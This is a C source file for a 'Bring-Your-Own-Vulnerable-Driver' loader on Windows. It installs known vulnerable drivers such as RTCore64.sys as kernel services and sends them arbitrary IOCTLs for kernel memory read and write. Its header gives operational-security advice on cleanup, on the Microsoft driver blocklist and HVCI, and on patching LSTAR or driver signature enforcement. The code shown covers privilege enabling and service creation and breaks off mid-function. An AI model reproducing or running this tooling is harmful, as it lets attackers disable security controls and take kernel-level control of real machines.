/*
 * byovd_loader.c - Generic Bring-Your-Own-Vulnerable-Driver harness.
 *
 * Installs a kernel driver as an SCM service, starts it, opens its device, and issues a
 * parameterised DeviceIoControl (IOCTL + input buffer from hex argv) so you can drive arbitrary
 * read/write drivers (e.g. ThrottleStop.sys / RTCore64.sys). Includes explicit stop + delete + file
 * cleanup. Requires local Administrator (SeLoadDriverPrivilege).
 *
 * USAGE
 *   byovd_loader.exe install  <ServiceName> <C:\path\driver.sys>
 *   byovd_loader.exe ioctl    <\\.\DeviceName> <IOCTL_hex> <inbuf_hex> [outlen]
 *   byovd_loader.exe uninstall <ServiceName> [C:\path\driver.sys]
 *   # one-shot:
 *   byovd_loader.exe run <ServiceName> <C:\path\driver.sys> <\\.\Device> <IOCTL_hex> <inbuf_hex>
 *
 * BUILD (MSVC):   cl /O2 byovd_loader.c
 * BUILD (mingw):  x86_64-w64-mingw32-gcc byovd_loader.c -o byovd_loader.exe -ladvapi32
 *
 * NOTES / OPSEC
 *   - Driver load is loud (Event 7045 kernel-mode driver) and persistent (on-disk .sys + service).
 *     ALWAYS uninstall after use; this tool deletes the service and optionally the .sys file.
 *   - VERIFY the driver is NOT on the Microsoft Vulnerable Driver Blocklist for the host build, and
 *     that HVCI / Memory Integrity is off, or NtLoadDriver will fail.
 *   - If your IOCTL patches an MSR (e.g. LSTAR) or DSE, restore the original value immediately or the
 *     box will BSOD. This harness only transports IOCTLs; the restore logic is your payload's job.
 *   - Authorized engagements only.
 */
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static int enable_priv(LPCSTR priv) {
    HANDLE tok; TOKEN_PRIVILEGES tp; LUID luid;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tok)) return 0;
    if (!LookupPrivilegeValueA(NULL, priv, &luid)) { CloseHandle(tok); return 0; }
    tp.PrivilegeCount = 1; tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    BOOL ok = AdjustTokenPrivileges(tok, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(tok);
    return ok && GetLastError() == ERROR_SUCCESS;
}

static int svc_install(const char *name, const char *path) {
    SC_HANDLE scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!scm) { printf("[-] OpenSCManager: %lu\n", GetLastError()); return 1; }
    SC_HANDLE svc = CreateServiceA(scm, name, name, SERVICE_ALL_ACCESS,
        SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
        path, NULL, NULL, NULL, NULL, NULL);
    if (!svc) {
        if (GetLastError() == ERROR_S